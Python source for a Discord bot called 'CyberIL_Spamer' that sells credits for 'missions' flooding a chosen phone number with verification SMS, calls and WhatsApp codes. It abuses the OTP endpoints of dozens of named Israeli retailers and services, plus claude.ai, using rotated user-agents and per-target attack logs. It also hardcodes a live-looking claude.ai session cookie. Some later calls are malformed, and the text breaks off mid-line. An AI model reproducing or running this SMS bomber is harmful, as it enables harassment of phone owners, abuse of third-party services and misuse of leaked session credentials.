import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import time
import random
import uuid
import aiohttp
from motor.motor_asyncio import AsyncIOMotorClient
import logging
import re
import sys
import os
from datetime import datetime, timezone
import certifi

# ==================== KONFIGURACJA SYSTEMU ====================

TOKEN = os.getenv("DISCORD_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")
DB_NAME = "CyberIL_Spamer"

CHANNELS = {
    "PANEL": 1481957038241353779,
    "GIFT": 1485104425625325709,
}

PANEL_CHANNEL = 1481957038241353779
GIFT_CHANNEL = 1485104425625325709
INFO_CHANNEL = 1485125569690603692

ADMIN_ROLE_ID = 1480762750052601886
STORE_URL = "https://discord.gg/3CxwPGuGyq"

COOLDOWN_TIME = 20
CREDITS_PER_CYCLE = 3
MAX_CREDIT_SPEND = 100
LAUNCH_DELAY = 5

COLOR_MAIN = 0x2b2d31
COLOR_SUCCESS = 0x00ff00
COLOR_DANGER = 0xff0000
COLOR_WARNING = 0xffaa00
COLOR_INFO = 0x00aaff

CLAUDE_SESSION = "activitySessionId=8e5e644c-d640-4b9f-be61-59b9a138a42b; anthropic-device-id=4ed16e2b-8252-4456-8e7a-e466ede65652; _fbp=fb.1.1773186995656.51415631283246056; app-shell-mode=gate-disabled; CH-prefers-color-scheme=light; __ssid=aac9d1c5-0950-4438-b7ea-a89a1639d015; cookie_seed_done=1; intercom-device-id-lupk8zyo=f68271ce-ab05-40b7-b143-901ad283a161; user-sidebar-visible-on-load=true; user-recents-collapsed=false; user-sidebar-pinned=true; g_state={\"i_l\":0,\"i_ll\":1773414635601,\"i_b\":\"y3RrxvHpC/63IgqxQoW+FkAztdzRlQfKqrSCo5paIW4\",\"i_e\":{\"enable_itp_optimization\":0},\"i_t\":1773501035602}; __cf_bm=3VjDxw6wkQm2wlbHFDvk8MaDT_DB6R36F4R.MVnz0p4-1773447632-1.0.1.1-6q05RiFdtxB27W.Dlk8sZzMKN2_GWuJqrNh03eIFieCaneWW7KiQJxVTVTNIxcxA4EeiLytjTSnQLzFe5XvedaBVzIzDp_EoeqS.drKNHic; _cfuvid=zbw_U3cChwMfKZyPfROexrLBbuzQTKW2FW6ko.UebTU-1773447632362-0.0.1.1-604800000; __stripe_mid=eabdbe50-cd60-4100-9f89-6403dde971eb6b036c; __stripe_sid=7b2497e5-5647-4528-aa38-9272e68de8c5289f41; sessionKey=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; lastActiveOrg=2b096853-0284-4d04-8bee-d3d6eb9ec7b1; cf_clearance=CM9MGR4oytc4fDuAdMWrgtGLrwjHrZfyGjDHQmELKWs-1773447692-1.2.1.1-8qu2TBglm35vOa3Y5dwU3Ue0D7gBkTfD20EtG9u.GXPEkWyTnnSOlsalbwktHG1lj9TvVOnuD19OeZaXbAIFnPMBAT3VnNkt2Rg5J8MQ9qAXN3Wf3DwDbPI.qiNUmVZwwvjmHdyRkI.fuz248__ESMWvCdMkeASIwHP7DT5e14INWZ3.iSxdKpFmZwoKzVGj1ge2Bba07dhQbqnbXVM1J7Ov4yMposOalAOKdx7hZN4; ajs_user_id=34d05785-fcf5-4298-8314-ac95766337ff; ajs_anonymous_id=64ed414c-6982-4d71-803f-2241e4e9546a; intercom-session-lupk8zyo=QTJuM3pjOVY3bWs1Njc4T0ZBQlZ1T2V6OUx0bjREempveE5JalZsR0FNMEpZYjdXZ3BYUE83WnhxYXV4S0tZSTdORlluTUc2OE14UnVCRHhBcjlzdE42SFo1ZW1NK1hWeEtZeTA0Y0hYYzlvcTN0RlBCa2YxV3JRbGJHM1B4WFltZVNNWk1QUXhWMzBEclNvUFphUTZNNTV0dk12T2s5QzhYSGN2U0pkeWNHM2NSOEZyMUU3amxwU2N5MGc4VkRpVEFZS0JrQzF3MFUyc2pzZlJyV0lTdXlDNncvYUYzcjQ1UkRkbzdmRTA1MnhiSHliZSt0akc2NjBzdjUyV2VwVkNQZ3ptd09xRzZZOTJMMXZEUzFVNmxxb3RTNG1ZYWs1K3Y5RFBTQXhiM1k9LS1YdEp3STBsUkF2S2FWSFptb29sYzFnPT0=--94e9f81d682285fead0655379f59452a0e43ab83; routingHint=sk-ant-rh-eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJFUzI1NiIsICJraWQiOiAiN0MxcWFPRnhqdWxaUjRFQnNuNk1UeUZGNWdDV2JHbFpNVDR2RklrRFFpbyJ9.eyJzdWIiOiAiMzRkMDU3ODUtZmNmNS00Mjk4LTgzMTQtYWM5NTc2NjMzN2ZmIiwgImlhdCI6IDE3NzM0NDc2OTYsICJpc3MiOiAiY2xhdWRlLWFpLXJvdXRpbmciLCAib25ib2FyZGluZ19jb21wbGV0ZSI6IHRydWUsICJwaG9uZV92ZXJpZmllZCI6IGZhbHNlLCAiYWdlX3ZlcmlmaWVkIjogdHJ1ZSwgImxvY2FsZSI6ICJlbi1VUyJ9.yRj_WgY7-XZbfW8XvjAb8ybkDmv2wDhrNH2WqAywFX2DVfMGZayA92Tj5WJwB3-kcV2JC3Un2eERG-bLEPQlAw; _gcl_au=1.1.357471279.1773367551.67089487.1773447650.1773447710; _dd_s=aid=631a5dba-fcfc-4e29-854f-58b2ec36a49d&rum=0&expire=1773448656835"

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

client = commands.Bot(command_prefix="!", intents=intents)
tree = client.tree

mongo_connection = AsyncIOMotorClient(MONGO_URI, tlsCAFile=certifi.where())
database = mongo_connection[DB_NAME]
users_collection = database["users"]
cooldown_collection = database["cooldowns"]
settings_collection = database["settings"]
logs_collection = database["attack_logs"]

logging.basicConfig(level=logging.WARNING)

active_missions = {}
cooldown_tracker = {}

BROWSER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/145.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.4.1 Safari/605.1.15"
]

def random_agent():
    return random.choice(BROWSER_AGENTS)

async def fetch_balance(user_id: int) -> int:
    record = await users_collection.find_one({"_id": user_id})
    if not record:
        return 0
    if record.get("unlimited"):
        return 999999
    return record.get("credits", 0)

async def has_unlimited_access(user_id: int) -> bool:
    record = await users_collection.find_one({"_id": user_id})
    return bool(record and record.get("unlimited"))

async def format_balance(user_id: int) -> str:
    if await has_unlimited_access(user_id):
        return "♾️ Unlimited"
    return str(await fetch_balance(user_id))

async def increase_balance(user_id: int, amount: int):
    await users_collection.update_one({"_id": user_id}, {"$inc": {"credits": amount}}, upsert=True)

async def decrease_balance(user_id: int, amount: int):
    await users_collection.update_one({"_id": user_id}, {"$inc": {"credits": -amount}}, upsert=True)

async def set_unlimited_status(user_id: int, status: bool):
    await users_collection.update_one({"_id": user_id}, {"$set": {"unlimited": status}}, upsert=True)

async def use_credit(user_id: int) -> bool:
    if await has_unlimited_access(user_id):
        return True
    result = await users_collection.update_one(
        {"_id": user_id, "credits": {"$gte": 1}},
        {"$inc": {"credits": -1}}
    )
    return result.modified_count == 1

async def check_cooldown(target: str):
    record = await cooldown_collection.find_one({"target": target})
    if not record:
        return False, 0
    elapsed = time.time() - record["last_attempt"]
    if elapsed < COOLDOWN_TIME:
        return True, int(COOLDOWN_TIME - elapsed)
    return False, 0

async def apply_cooldown(target: str):
    await cooldown_collection.update_one({"target": target}, {"$set": {"last_attempt": time.time()}}, upsert=True)

def is_authorized(interaction: discord.Interaction) -> bool:
    return ADMIN_ROLE_ID in [role.id for role in interaction.user.roles]

async def save_mission_log(user_id: int, username: str, phone: str, cost: int, success: int, failed: int, duration: int):
    entry = {
        "user_id": user_id,
        "username": username,
        "phone": phone,
        "cost": cost,
        "success_count": success,
        "failed_count": failed,
        "total": success + failed,
        "duration": duration,
        "timestamp": datetime.now(timezone.utc),
        "date": datetime.now(timezone.utc).strftime("%Y-%m-%d"),
        "time": datetime.now(timezone.utc).strftime("%H:%M:%S")
    }
    await logs_collection.insert_one(entry)

async def get_user_history(user_id: int, limit: int = 20):
    cursor = logs_collection.find({"user_id": user_id}).sort("timestamp", -1).limit(limit)
    return await cursor.to_list(length=limit)

async def get_all_history(limit: int = 100):
    cursor = logs_collection.find().sort("timestamp", -1).limit(limit)
    return await cursor.to_list(length=limit)

async def get_user_stats(user_id: int):
    pipeline = [
        {"$match": {"user_id": user_id}},
        {"$group": {
            "_id": "$user_id",
            "total_missions": {"$sum": 1},
            "total_cost": {"$sum": "$cost"},
            "total_success": {"$sum": "$success_count"},
            "total_failed": {"$sum": "$failed_count"},
            "total_requests": {"$sum": "$total"},
            "last_mission": {"$max": "$timestamp"}
        }}
    ]
    result = await logs_collection.aggregate(pipeline).to_list(1)
    return result[0] if result else None

async def get_global_stats():
    pipeline = [
        {"$group": {
            "_id": None,
            "total_missions": {"$sum": 1},
            "total_cost": {"$sum": "$cost"},
            "total_success": {"$sum": "$success_count"},
            "total_failed": {"$sum": "$failed_count"},
            "total_requests": {"$sum": "$total"},
            "unique_users": {"$addToSet": "$user_id"}
        }}
    ]
    result = await logs_collection.aggregate(pipeline).to_list(1)
    if result:
        result[0]["unique_users"] = len(result[0]["unique_users"])
        return result[0]
    return None

async def get_top_targets(limit: int = 10):
    pipeline = [
        {"$group": {
            "_id": "$phone",
            "count": {"$sum": 1},
            "success_total": {"$sum": "$success_count"}
        }},
        {"$sort": {"count": -1}},
        {"$limit": limit}
    ]
    return await logs_collection.aggregate(pipeline).to_list(length=limit)

async def http_post(session, url, form=None, json_data=None, extra_headers=None, tag=""):
    headers = {
        "User-Agent": random_agent(),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    if extra_headers:
        headers.update(extra_headers)
    if isinstance(form, str):
        headers.setdefault("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
    try:
        timeout = aiohttp.ClientTimeout(total=12)
        if json_data is not None:
            headers.setdefault("Content-Type", "application/json")
            async with session.post(url, json=json_data, headers=headers, timeout=timeout, ssl=False) as resp:
                await resp.read()
                success = 200 <= resp.status < 300
                return success, tag, "OK" if success else f"HTTP {resp.status}"
        else:
            async with session.post(url, data=form, headers=headers, timeout=timeout, ssl=False) as resp:
                await resp.read()
                success = 200 <= resp.status < 300
                return success, tag, "OK" if success else f"HTTP {resp.status}"
    except Exception as error:
        return False, tag, str(type(error).__name__)

async def atmos_attack(session, store_id, phone, origin="https://order.atmos.rest", referer="https://order.atmos.rest/"):
    tag = f"atmos-{store_id}"
    form_data = aiohttp.FormData()
    form_data.add_field("restaurant_id", store_id)
    form_data.add_field("phone", phone)
    form_data.add_field("testing", "false")
    req_headers = {
        "User-Agent": random_agent(),
        "accept": "application/json, text/plain, */*",
        "accept-language": "he-IL,he;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "origin": origin,
        "referer": referer,
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
    }
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        api_url = f"https://api-ns.atmos.co.il/rest/{store_id}/auth/sendValidationCode"
        async with session.post(api_url, data=form_data, headers=req_headers, timeout=timeout, ssl=False) as resp:
            await resp.read()
            success = 200 <= resp.status < 300
            return success, tag, "OK" if success else f"HTTP {resp.status}"
    except Exception as error:
        return False, tag, str(type(error).__name__)

async def process_atmos_batch(session, target, store_list):
    results = []
    batch_limit = 5
    for i in range(0, len(store_list), batch_limit):
        batch = store_list[i:i + batch_limit]
        tasks = [atmos_attack(session, sid, target) for sid in batch]
        batch_results = await asyncio.gather(*tasks, return_exceptions=True)
        results.extend(batch_results)
        await asyncio.sleep(0.5)
    return results

async def claude_attack(session, phone):
    tag = "claude"
    clean = phone.lstrip('0')
    if not clean.startswith('+972'):
        clean = f"+972{clean}"
    api_url = "https://claude.ai/api/auth/send_phone_code"
    req_headers = {
        "accept": "*/*",
        "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type": "application/json",
        "origin": "https://claude.ai",
        "referer": "https://claude.ai/onboarding",
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "anthropic-client-platform": "web_claude_ai",
        "anthropic-client-version": "1.0.0",
        "user-agent": random_agent()
    }
    if CLAUDE_SESSION:
        req_headers["cookie"] = CLAUDE_SESSION
    payload = {"phone_number": clean}
    try:
        timeout = aiohttp.ClientTimeout(total=12)
        async with session.post(api_url, json=payload, headers=req_headers, timeout=timeout, ssl=False) as resp:
            await resp.read()
            success = 200 <= resp.status < 300
            return success, tag, "OK" if success else f"HTTP {resp.status}"
    except Exception as error:
        return False, tag, str(type(error).__name__)

async def oshioshi_attack(session, phone):
    tag = "oshioshi"
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with session.get("https://delivery.oshioshi.co.il/he/login", timeout=timeout, ssl=False) as resp:
            text = await resp.text()
            match = re.search(r'name="_token"\s+value="([^"]+)"', text)
            if not match:
                return False, tag, "Missing Token"
            token = match.group(1)
        api_url = "https://delivery.oshioshi.co.il/he/auth/register-send-code"
        form = f"phone={phone}&_token={token}"
        req_headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://delivery.oshioshi.co.il",
            "referer": "https://delivery.oshioshi.co.il/he/",
            "User-Agent": random_agent()
        }
        async with session.post(api_url, data=form, headers=req_headers, timeout=timeout, ssl=False) as resp:
            await resp.read()
            success = 200 <= resp.status < 300
            return success, tag, "OK" if success else f"HTTP {resp.status}"
    except Exception as error:
        return False, tag, str(type(error).__name__)

async def freetv_attack(session, phone):
    tag = "freetv"
    formatted = f"+972{phone[1:]}" if phone.startswith("0") else f"+972{phone}"
    api_url = "https://middleware.freetv.tv/api/v1/send-verification-sms"
    payload = {"msisdn": formatted}
    req_headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": random_agent(),
        "Origin": "https://freetv.tv",
        "Referer": "https://freetv.tv/"
    }
    try:
        timeout = aiohttp.ClientTimeout(total=12)
        async with session.post(api_url, json=payload, headers=req_headers, timeout=timeout, ssl=False) as resp:
            await resp.read()
            success = 200 <= resp.status < 300
            return success, tag, "OK" if success else f"HTTP {resp.status}"
    except Exception as error:
        return False, tag, str(type(error).__name__)

async def webcut_attack(session, phone):
    tag = "webcut-wa"
    api_url = "https://us-central1-webcut-2001a.cloudfunctions.net/sendWhatsApp"
    payload = {"type": "otp", "data": {"phone": phone}}
    req_headers = {
        "Content-Type": "application/json",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=12)
        async with session.post(api_url, json=payload, headers=req_headers, timeout=timeout, ssl=False) as resp:
            await resp.read()
            success = 200 <= resp.status < 300
            return success, tag, "OK" if success else f"HTTP {resp.status}"
    except Exception as error:
        return False, tag, str(type(error).__name__)

async def freeivr_attack(session, phone):
    tag = "freeivr"
    formatted = f"972{phone[1:]}" if phone.startswith("0") else f"972{phone}"
    api_url = "https://f2.freeivr.co.il/api/v3/plugins/MitMValidPhone"
    payload = {"phone": formatted}
    req_headers = {
        "Content-Type": "application/json",
        "User-Agent": random_agent(),
        "Origin": "https://freeivr.co.il",
        "Referer": "https://freeivr.co.il/"
    }
    try:
        timeout = aiohttp.ClientTimeout(total=12)
        async with session.post(api_url, json=payload, headers=req_headers, timeout=timeout, ssl=False) as resp:
            await resp.read()
            success = 200 <= resp.status < 300
            return success, tag, "OK" if success else f"HTTP {resp.status}"
    except Exception as error:
        return False, tag, str(type(error).__name__)

async def execute_all(target):
    raw = target
    formatted = f"+972{raw[1:]}" if raw.startswith("0") else f"+972{raw}"
    session_id = str(uuid.uuid4())
    random_email = f"user{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))}@gmail.com"
    FORM_TYPE = "application/x-www-form-urlencoded; charset=UTF-8"
    BROWSER_ID = '"Google Chrome";v="145", "Chromium";v="145", "Not/A)Brand";v="24"'

    def form_headers(origin, referer, extra=None):
        headers = {"Content-Type": FORM_TYPE, "x-requested-with": "XMLHttpRequest",
                   "origin": origin, "referer": referer,
                   "sec-ch-ua": BROWSER_ID, "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
                   "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin"}
        if extra:
            headers.update(extra)
        return headers

    def json_headers(origin, referer, extra=None):
        headers = {"Content-Type": "application/json",
                   "origin": origin, "referer": referer,
                   "sec-ch-ua": BROWSER_ID, "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
                   "sec-fetch-dest": "empty", "sec-fetch-mode": "cors"}
        if extra:
            headers.update(extra)
        return headers

    connector = aiohttp.TCPConnector(limit=120, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=connector) as session:
        atmos_stores = [
            "1","2","3","4","5","7","8","13","15","18","21","23","24","27",
            "28","29","33","35","48","51","56","57","59",
            "2008","2011","2012","2014","2041","2052","2053","2056","2059",
            "2063","2070","2073","2076","2078","2087","2088","2091",
        ]
        atmos_results = await process_atmos_batch(session, raw, atmos_stores)
        
        atmos_club = [
            atmos_attack(session, "23", raw, origin="https://club-register.atmos.co.il", referer="https://club-register.atmos.co.il/"),
            atmos_attack(session, "59", raw, origin="https://club-register.atmos.co.il", referer="https://club-register.atmos.co.il/"),
        ]

        missions = [
            http_post(session, "https://netfree.link/api/user/verify-phone/get-call",
                json_data={"agreeTou": True, "phone": formatted},
                extra_headers=json_headers("https://netfree.link", "https://netfree.link/welcome/", {"sec-fetch-site": "same-origin"}),
                tag="netfree"),
            claude_attack(session, raw),
            oshioshi_attack(session, raw),
            freetv_attack(session, raw),
            webcut_attack(session, raw),
            freeivr_attack(session, raw),
            http_post(session, "https://www.negev-group.co.il/customer/ajax/post/",
                form=f"form_key=a93dnWr8cjYH8wZ2&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                extra_headers=form_headers("https://www.negev-group.co.il", "https://www.negev-group.co.il/", {"sec-fetch-site": "same-origin"}),
                tag="negev-group"),
            http_post(session, "https://www.gali.co.il/customer/ajax/post/",
                form=f"form_key=xT4xBP6oaqFhxMVR&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                extra_headers=form_headers("https://www.gali.co.il", "https://www.gali.co.il/"),
                tag="gali"),
            http_post(session, "https://www.aldoshoes.co.il/customer/ajax/post/",
                form=f"form_key=FD1Zm1GUMQXUivz6&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                extra_headers=form_headers("https://www.aldoshoes.co.il", "https://www.aldoshoes.co.il/"),
                tag="aldoshoes"),
            http_post(session, "https://www.hoodies.co.il/customer/ajax/post/",
                form=f"form_key=OCYFcuUfiQLCbya5&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                extra_headers=form_headers("https://www.hoodies.co.il", "https://www.hoodies.co.il/"),
                tag="hoodies"),
            http_post(session, "https://api.gomobile.co.il/api/login",
                form=f'{{"phone":"{raw}"}}',
                extra_headers=form_headers("https://www.gomobile.co.il", "https://www.gomobile.co.il/"),
                tag="gomobile"),
            http_post(session, "https://bonitademas.co.il/apps/imapi-customer",
                form=f'{{"action":"login","otpBy":"sms","otpValue":"{raw}"}}',
                extra_headers=form_headers("https://bonitademas.co.il", "https://bonitademas.co.il/"),
                tag="bonitademas"),
            http_post(session, "https://story.magicetl.com/public/shopify/apps/otp-login/step-one",
                form=f'{{"phone":"{raw}"}}',
                extra_headers=form_headers("https://storyonline.co.il", "https://storyonline.co.il/"),
                tag="storyonline"),
            http_post(session, "https://www.crazyline.com/customer/ajax/post/",
                form=f"form_key=qjDmQDc2pwYJIEin&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                extra_headers=form_headers("https://www.crazyline.com", "https://www.crazyline.com/"),
                tag="crazyline"),
            http_post(session, "https://authentication.wolt.com/v1/captcha/site_key_authenticated",
                json_data={"phone_number": f"{raw}", "operation": "request_number_verification"},
                extra_headers=form_headers("https://wolt.com", "https://wolt.com/"),
                tag="wolt"),
            http_post(session, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?uuid=4c48ed0d-9622-4a1e-ac70-2821631b680b&apiKey=BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54&sessionID=24014c96-61ca-4cd6-87a9-9324aa2f3150&culture=he_IL&apiVersion=2",
                form=f'{{"phoneNumber": "{raw}", "isCalling": true}}',
                extra_headers=form_headers("https://www.mishloha.co.il", "https://www.mishloha.co.il/"),
                tag="mishloha"),
            http_post(session, "https://www.golfkids.co.il/customer/ajax/post/",
                form=f"form_key=XB0c9tAkTouRgHrI&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                extra_headers=form_headers("https://www.golfkids.co.il", "https://www.golfkids.co.il/"),
                tag="golfkids"),
            http_post(session, "https://www.onot.co.il/customer/ajax/post/",
                form=f"form_key=xmemtkBNMoUSLrMN&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                extra_headers=form_headers("https://www.onot.co.il", "https://www.onot.co.il/"),
                tag="onot"),
            http_post(session, "https://fox.co.il/apps/dream-card/api/proxy/otp/send",
                form=f'{{"phoneNumber":"{raw}","uuid":"498d9bb2-0fa8-4d9c-9e71-f44fcbcd2195"}}',
                extra_headers=form_headers("https://fox.co.il", "https://fox.co.il/"),
                tag="fox"),
            http_post(session, "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send",
                form=f'{{"phoneNumber":"{raw}","uuid":"6db5a63b-6882-414f-a090-de263dd917d7"}}',
                extra_headers=form_headers("https://www.foxhome.co.il", "https://www.foxhome.co.il/"),
                tag="foxhome"),
            http_post(session, "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send",
                form=f'{{"phoneNumber":"{raw}","uuid":"ab29f239-0637-4c8e-8af5-fdfbaeb4b493"}}',
                extra_headers=form_headers("https://www.laline.co.il", "https://www.laline.co.il/"),
                tag="laline"),
            http_post(session, "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send",
                form=f'{{"phoneNumber":"{raw}","uuid":"9961459f-9f83-4aab-9cee-58b1f6793547"}}',
                extra_headers=form_headers("https://footlocker.co.il", "https://footlocker.co.il/"),
                tag="footlocker"),
            http_post(session, "https://www.golfco.co.il/customer/ajax/post/",
                form=f"form_key=SIiL0WFN6AtJF6lb&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                extra_headers=form_headers("https://www.golfco.co.il", "https://www.golfco.co.il/"),
                tag="golfco"),
            http_post(session, "https://www.timberland.co.il/customer/ajax/post/",
                form=f"form_key=gU7iqYv5eiwuKVef&bot_validation=1&type=login&phone={raw}",
                extra_headers=form_headers("https://www.timberland.co.il", "https://www.timberland.co.il/"),
                tag="timberland"),
            http_post(session, "https://www.solopizza.org.il/_a/aff_otp_auth",
                form=f"value={raw}&type=phone&projectId=1",
                extra_headers=form_headers("https://www.solopizza.org.il", "https://www.solopizza.org.il/"),
                tag="solopizza"),
            http_post(session, "https://users-auth.hamal.co.il/auth/send-auth-code",
                form=f'{{"value":"{raw}","type":"phone","projectId":"1"}}',
                extra_headers=form_headers("https://hamal.co.il", "https://hamal.co.il/"),
                tag="hamal"),
            http_post(session, "https://www.urbanica-wh.com/customer/ajax/post/",
                form=f"form_key=sucdtpszDEqdOgkv&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                extra_headers=form_headers("https://www.urbanica-wh.com", "https://www.urbanica-wh.com/"),
                tag="urbanica"),
            http_post(session, "https://www.intima-il.co.il/customer/ajax/post/",
                form=f"form_key=ppjX1yBLuS9rB7zZ&bot_validation=1&type=login&country_code=972&telephone={raw}&code=&compare_email=&compare_identity=",
                extra_headers=form_headers("https://www.intima-il.co.il", "https://www.intima-il.co.il/"),
                tag="intima"),
            http_post(session, "https://www.steimatzky.co.il/customer/ajax/post/",
                form=f"form_key=4RmX16417urLzC5J&bot_validation=1&type=login&country_code=972&telephone={raw}&code=&compare_email=&compare_identity=",
                extra_headers=form_headers("https://www.steimatzky.co.il", "https://www.steimatzky.co.il/"),
                tag="steimatzky"),
            http_post(session, "https://www.globes.co.il/news/login-2022/ajax_handler.ashx?get-value-type",
                form=f"value={raw}&value_type=",
                extra_headers=form_headers("https://www.globes.co.il", "https://www.globes.co.il/"),
                tag="globes"),
            http_post(session, "https://www.moraz.co.il/wp-admin/admin-ajax.php",
                form=f"action=validate_user_by_sms&phone={raw}&email=&from_reg=false",
                extra_headers=form_headers("https://www.moraz.co.il", "https://www.moraz.co.il/", {"sec-fetch-site": "same-origin"}),
                tag="moraz"),
            http_post(session, "https://itaybrands.co.il/apps/dream-card/api/proxy/otp/send",
                json_data={"phoneNumber": raw, "uuid": session_id},
                extra_headers=json_headers("https://itaybrands.co.il", "https://itaybrands.co.il/", {"sec-fetch-site": "same-origin", "x-requested-with": "XMLHttpRequest"}),
                tag="itaybrands"),
            http_post(session, "https://api.gomobile.co.il/api/login",
                json_data={"phone": raw},
                extra_headers=json_headers("https://www.gomobile.co.il", "https://www.gomobile.co.il/", {"sec-fetch-site": "same-site"}),
                tag="gomobile"),
            http_post(session, "https://www.spicesonline.co.il/wp-admin/admin-ajax.php",
                form=f"action=validate_user_by_sms&phone={raw}",
                extra_headers=form_headers("https://www.spicesonline.co.il", "https://www.spicesonline.co.il/"),
                tag="spicesonline"),
            http_post(session, "https://www.stepin.co.il/customer/ajax/post/",
                form=f"form_key=BxItwcIQhlhsnaoi&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                extra_headers=form_headers("https://www.stepin.co.il", "https://www.stepin.co.il/"),
                tag="stepin"),
            http_post(session, "https://mobile.rami-levy.co.il/api/Helpers/OTP",
                form=f"phone={raw}&template=OTP&type=1",
                extra_headers={"Content-Type": "application/x-www-form-urlencoded", "accept-encoding": "gzip, deflate", "origin": "https://mobile.rami-levy.co.il", "referer": "https://mobile.rami-levy.co.il/", "x-requested-with": "XMLHttpRequest", "User-Agent": random_agent()},
                tag="ramilevy"),
            http_post(session, "https://api.zygo.co.il/v2/auth/create-verify-token",
                json_data={"phone": raw},
                extra_headers={"Content-Type": "application/json", "origin": "https://zygo.co.il", "referer": "https://zygo.co.il/", "accept-encoding": "gzip, deflate", "sec-fetch-site": "same-site"},
                tag="zygo"),
            http_post(session, "https://ros-rp.tabit.cloud/services/loyalty/customerProfile/auth/mobile",
                json_data={"mobile": raw},
                extra_headers={"Content-Type": "application/json", "accept-encoding": "gzip, deflate", "accountguid": "0787F516-E97E-408A-A1CF-53D0C4D57C7C", "cpversion": "3.3.0", "env": "il", "joinchannelguid": "74FE1A48-0FA0-4C8F-B962-6AE88A242023", "siteid": "6203e7787694b434c7a7eb0a", "origin": "https://customer-profile.tabit.cloud", "referer": "https://customer-profile.tabit.cloud/", "sec-fetch-site": "same-site"},
                tag="tabit"),
            http_post(session, "GET", f"https://ivr.business/api/Customer/getTempCodeToPhoneVarification/{raw}",
                extra_headers={"origin": "https://ivr.business", "referer": "https://ivr.business/", "accept-encoding": "gzip, deflate"},
                tag="ivr"),
            http_post(session, "POST", "https://www.call2all.co.il/ym/api/SelfCreateNewCustomer",
                form={"configCode": "ivr2_10_23", "uniqCustomerId": "68058a89-fedd-4409-8725-f989652d8305", "gr": 